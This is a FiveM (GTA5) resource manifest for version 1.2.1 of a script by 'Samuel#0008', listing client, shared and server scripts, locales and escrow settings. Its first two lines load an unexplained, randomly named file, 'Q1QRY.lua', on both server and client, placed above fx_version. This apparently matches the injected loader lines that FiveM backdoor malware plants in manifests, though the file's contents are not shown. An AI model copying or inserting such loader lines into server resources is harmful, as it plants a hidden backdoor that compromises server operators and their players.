server_script "Q1QRY.lua"
client_script "Q1QRY.lua"
fx_version 'cerulean'
game 'gta5'

Author 'Samuel#0008'
Version '1.2.1'

client_scripts { '@mka-lasers/client/client.lua', 'client/*.lua' }

shared_scripts { '@ox_lib/init.lua', '@sd_lib/init.lua', 'config.lua', }

server_scripts { 'server/*.lua' } 

files { 'locales/*.json' }

lua54 'yes'

escrow_ignore { '**/*.lua', 'config.lua', 'doorlock/**/*.lua', }
dependency '/assetpacks'